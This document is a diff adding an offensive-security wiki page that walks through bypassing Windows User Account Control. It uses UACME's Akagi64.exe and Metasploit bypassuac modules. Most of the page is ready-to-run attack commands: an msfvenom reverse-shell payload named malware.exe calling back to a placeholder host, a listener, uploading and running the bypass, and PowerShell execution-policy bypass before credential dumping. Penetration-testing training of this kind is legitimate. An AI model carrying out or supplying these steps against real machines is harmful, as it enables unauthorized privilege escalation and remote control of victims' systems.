@@ -1,0 +1,203 @@
+---
+title: Windows UAC Bypass (User Account Control)
+description: Bypassing User Account Control to elevate from Medium to High Integrity context using UACME and Metasploit modules.
+draft: false
+tags:
+  - T1548.002
+  - Privilege Escalation
+---
+
+<Callout type="info" title="Concept Overview">
+**User Account Control (UAC)** is a Windows security feature that prevents unauthorized changes to the OS by prompting the user for permission or an administrator password. If an attacker compromises a user account that is a member of the local Administrators group, they are running in a "Medium Integrity" context. To perform privileged actions (like `getsystem` or `hashdump`), the attacker must bypass UAC to elevate to "High Integrity".
+
+**MITRE ATT&CK Mapping:**
+* [T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
+</Callout>
+
+!["dfd"](/docs/Asset/qu.jpg)
+
+---
+
+## UAC Bypass Flow
+
+```mermaid
+%%{init: {'theme': 'base', 'themeVariables': { 'background': '#050505', 'primaryColor': '#111118', 'edgeLabelBackground':'#050505', 'primaryTextColor': '#ffffff', 'primaryBorderColor': '#FF003C', 'lineColor': '#FF003C', 'fontFamily': 'monospace' }}}%%
+flowchart LR
+    A["Compromised Admin User<br>Medium Integrity"] --> B{Attempt UAC Bypass}
+    B -- "UACME / MSF Module" --> C["High Integrity Process"]
+    C --> D["NT AUTHORITY\SYSTEM"]
+
+    classDef default fill:#111118,stroke:#585b70,stroke-width:1px,color:#ffffff;
+    classDef attacker fill:#2a0008,stroke:#FF003C,stroke-width:2px,color:#FF003C;
+    classDef action fill:#1a1a1a,stroke:#FFC107,stroke-width:2px,color:#FFC107;
+    classDef exec fill:#1a1a1a,stroke:#D500F9,stroke-width:2px,color:#D500F9;
+
+    class A attacker;
+    class B,C action;
+    class D exec;
+```
+
+<Callout type="warning" title="Prerequisites for UAC Bypass">
+1. The compromised user **must** be a member of the local `Administrators` group.
+2. UAC must not be set to "Always Notify" (Highest setting), otherwise, interactive prompts will block automated bypasses.
+</Callout>
+
+---
+
+## Bypass Methods
+
+<Tabs>
+  <Tab title="Method 1: UACME (Akagi64.exe)">
+    UACME is a highly curated collection of Windows UAC bypass methods. It uses various DLL hijacking and COM interface abuses to launch a payload with High Integrity without prompting the user.
+
+    <Steps>
+      <Step title="Step 1: Generate Payload & Setup Listener">
+        <AccordionGroup>
+          <Accordion title="Bash Commands">
+            ```bash
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o malware.exe
+
+            msfconsole -qx "use exploit/multi/handler; set lhost x.x.x.x; set lport 4444; set payload windows/x64/meterpreter/reverse_tcp; run -j"
+            ```
+          </Accordion>
+        </AccordionGroup>
+      </Step>
+
+      <Step title="Step 2: Prepare the Session">
+        *Migrating to a stable user process like `explorer.exe` ensures you have the correct user token.*
+        <AccordionGroup>
+          <Accordion title="Meterpreter Commands">
+            ```ruby
+            meterpreter> migrate -N explorer.exe
+            meterpreter> getuid
+            meterpreter> getprivs  # Verify current privileges
+            ```
+          </Accordion>
+        </AccordionGroup>
+      </Step>
+
+      <Step title="Step 3: Upload & Execute">
+        <AccordionGroup>
+          <Accordion title="Meterpreter & CMD Commands">
+            ```ruby
+            meterpreter> upload malware.exe C:\\Windows\\Temp\\malware.exe
+            meterpreter> upload tools/UACME/Akagi64.exe C:\\Windows\\Temp\\Akagi64.exe
+            meterpreter> shell
+            ```
+            ```cmd
+            :: Syntax: Akagi64.exe <Method_ID> <Payload_Path>
+            :: Method 23 is a common and reliable bypass (e.g., fodhelper hijack)
+            C:\Windows\Temp\Akagi64.exe 23 C:\Windows\Temp\malware.exe
+            ```
+            *If successful, a new Meterpreter session will open in High Integrity context.*
+          </Accordion>
+        </AccordionGroup>
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Method 2: Metasploit BypassUAC Modules">
+    If you prefer using built-in Metasploit modules, there are several available. These attempt to bypass UAC by abusing built-in Windows auto-elevating binaries.
+
+    <Steps>
+      <Step title="Step 1: Confirm UAC is the issue">
+        <AccordionGroup>
+          <Accordion title="Meterpreter Command">
+            ```ruby
+            # 1. Check if getsystem fails (confirming UAC is the issue)
+            meterpreter> getsystem
+            # [-] priv_elevate_getsystem: Operation failed: Access is denied.
+
+            # 2. Background the session
+            meterpreter> background
+            ```
+          </Accordion>
+        </AccordionGroup>
+      </Step>
+
+      <Step title="Step 2: Search and Configure Module">
+        <AccordionGroup>
+          <Accordion title="MSFconsole Commands">
+            ```ruby
+            # 3. Search for bypass modules
+            msf6> search bypassuac
+
+            # 4. Use a specific module (e.g., injection or sdclt bypass)
+            msf6> use exploit/windows/local/bypassuac_injection
+            # OR
+            msf6> use exploit/windows/local/bypassuac_sdclt
+
+            # 5. Configure and run
+            msf6> set SESSION 1
+            msf6> set payload windows/x64/meterpreter/reverse_tcp
+            msf6> set LHOST x.x.x.x
+            msf6> set LPORT 4444
+
+            # If default target fails, check and change the target architecture
+            msf6> show targets
+            msf6> set target 1  # (e.g., Windows x86/x64)
+
+            msf6> exploit
+            ```
+          </Accordion>
+        </AccordionGroup>
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+---
+
+## Post-Bypass Verification & Enumeration
+
+<Callout type="success" title="Verifying High Integrity">
+After a successful UAC bypass, you will get a new session. You must verify that you are now running in "High Integrity" before attempting to dump passwords or impersonate SYSTEM.
+</Callout>
+
+<Steps>
+  <Step title="Step 1: Check Token Integrity Level">
+    <AccordionGroup>
+      <Accordion title="PowerShell Commands">
+        ```ruby
+        meterpreter> shell
+        ```
+        ```powershell
+        powershell -ep bypass
+
+        # Import the NTObjectManager module (often used for token manipulation)
+        Import-Module NTObjectManager
+
+        # Check the integrity level
+        Get-NtTokenIntegrityLevel
+        # Output should be: High
+        ```
+      </Accordion>
+    </AccordionGroup>
+  </Step>
+
+  <Step title="Step 2: Run PrivescCheck for further escalation">
+    <AccordionGroup>
+      <Accordion title="PrivescCheck Execution">
+        ```powershell
+        powershell -ep bypass -c ". .\PrivescCheck.ps1"
+
+        # Run the audit to find further misconfigurations or paths to SYSTEM
+        Invoke-PrivescCheck
+        ```
+      </Accordion>
+    </AccordionGroup>
+  </Step>
+</Steps>
+
+---
+
+## Tools & Resources
+
+<CardGroup cols={2}>
+  <Card title="UACME (hfiref0x)" href="https://github.com/hfiref0x/UACME" icon="github">
+    A highly curated collection of Windows UAC bypass methods (Akagi64.exe).
+  </Card>
+  <Card title="PrivescCheck (itm4n)" href="https://github.com/itm4n/PrivescCheck" icon="github">
+    PowerShell script to find further misconfigurations or paths to SYSTEM.
+  </Card>
+</CardGroup>
